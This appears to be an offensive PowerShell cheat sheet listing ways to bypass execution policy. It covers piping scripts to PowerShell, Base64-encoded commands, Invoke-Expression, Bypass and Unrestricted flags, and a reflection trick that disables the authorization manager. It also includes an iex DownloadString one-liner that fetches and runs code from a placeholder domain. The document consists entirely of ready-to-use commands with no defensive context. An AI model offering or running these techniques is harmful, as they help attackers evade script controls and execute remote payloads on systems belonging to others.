### check execution policy 
```
Get-ExecutionPolicy -List | Format-Table -AutoSize
```

### different bypass techniques
```
Echo Write-Host "<command>"  | PowerShell.exe -noprofile -

Get-Content <file>.ps1 | PowerShell.exe -noprofile -  

type <file>.ps1 | PowerShell.exe -noprofile -  

powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('<domain>/<file>')"  

Powershell -command "Write-Host '<command>'"  

Powershell -c "Write-Host '<command>'"  

$command = "Write-Host '<command>'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand  

Invoke-Command -scriptblock {Write-Host "<command>"}  

Get-Content .<file>.ps1 | Invoke-Expression  

PowerShell.exe -ExecutionPolicy Bypass -File <file>.ps1  

PowerShell.exe -ExecutionPolicy UnRestricted -File <file>.ps1  

PowerShell.exe -ExecutionPolicy Remote-signed -File <file>.ps1  

function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield("context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))}  Disable-ExecutionPolicy  <file>.ps1  

Set-ExecutionPolicy Bypass -Scope Process -Force  

Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted -Force  
```

